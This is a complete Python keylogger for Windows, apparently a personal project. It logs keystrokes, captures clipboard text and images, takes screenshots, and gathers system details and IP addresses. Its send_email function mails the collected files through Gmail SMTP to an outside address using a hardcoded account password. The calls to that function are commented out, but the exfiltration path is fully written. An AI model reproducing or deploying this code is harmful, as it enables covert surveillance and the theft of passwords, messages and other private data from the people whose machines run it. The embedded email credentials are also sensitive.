from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.application import MIMEApplication
from email import encoders
import smtplib
import socket
import platform
import win32clipboard
from pynput.keyboard import Key, Listener
import time
import os
import getpass
from requests import get
from multiprocessing import Process, freeze_support
from PIL import ImageGrab, Image

file_path = "C:\\Users\\LENOVO\\Desktop\\bitskrieg\\keyloggerV1"
extend = "\\"
file_info = "key_log.txt"
sys_info = "sysinfo.txt"
clipboard_info = "clipinfo.txt"
scinfo = "screenshot.png"

email_address = "keytest762@gmail.com"
password = "fzhyfkpzkzkqrmxq"

toaddress = "mewofo3604@operades.com"

time_itr = 15
iterationsEnd = 3

# Email log files 
def send_email(filename, attachment, toaddress):
    fromaddress = email_address

    msg = MIMEMultipart()
    msg['From'] = fromaddress
    msg['To'] = toaddress
    msg['Subject'] = "Key log testing"
    body = 'Body of the mail'
    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')

    p.set_payload((attachment).read())

    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)

    s.starttls()

    s.login(fromaddress, password)

    text = msg.as_string()

    s.sendmail(fromaddress, toaddress, text)

    s.quit()

#send_email(file_info, file_path+extend+file_info, toaddress)

# get computer information(IP,hostname)
def comp_info():
    with open(file_path+extend+sys_info,"w") as s_info:
        hostname = socket.gethostname()
        #get private IP address
        IPAddr = socket.gethostbyname(hostname)
        # trying to get Public IP(doesn't work)
        try: 
            public_IP = get("https://ifconfig.me").text
            s_info.write("Public IP address: "+ public_IP+"\n")
        except Exception:
            s_info.write("Couldn't access public IP"+"\n")
        s_info.write("System: " + platform.system() + " " + platform.version()+"\n")
        s_info.write("Hostname: " + hostname+"\n")
        s_info.write("Machine: "+platform.machine()+"\n")
        s_info.write("private IP: " + IPAddr+"\n")
comp_info()
#send_email(sys_info, file_path + extend + sys_info, toaddress)

def copy_clipboard():
    with open(file_path+extend+clipboard_info,"a") as c_info:
        # If text is copied
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            c_info.write("Clipboard Data: \n"+pasted_data)
            
        except:
            c_info.write("Clipboard couldn't be pasted(Might not be a text)")

        # If image is copied
        image = ImageGrab.grabclipboard()
        if isinstance(image, Image.Image):
            image.save(file_path+extend+"clipboard_image.png")
            #send_email("clipboard_image.png", file_path + extend + "clipboard_image.png", toaddress)
        else:
            pass


def screenshot():
    im = ImageGrab.grab()
    im.save(file_path+extend+scinfo)


iterations = 0
currentTime = time.time()
stoppingTime = currentTime+time_itr 

while iterations < iterationsEnd:
    keys = []
    count = 0

    # Listening for keys
    def on_press(key):
        global keys, count, currentTime
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys =[]

    def write_file(keys):
        with open(file_path+extend+file_info, "a") as f_write:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f_write.write('\n')
                    f_write.close()
                elif k.find("Key") == -1:
                    f_write.write(k)
                    f_write.close()

    def on_rel(key):
        if key == Key.esc:
            return False
        if currentTime>stoppingTime:
            return False

    with Listener(on_press=on_press,on_release=on_rel) as listener:
        listener.join()

    if currentTime>stoppingTime:
        with open(file_path+extend+file_info, "w") as f:
            f.write(" ")

        screenshot()
        #send_email(scinfo, file_path + extend + scinfo, toaddress)

        copy_clipboard()
        #send_email(clipboard_info, file_path + extend + clipboard_info, toaddress)
        
        iterations+=1
        currentTime = time.time()
        stoppingTime = time.time()+time_itr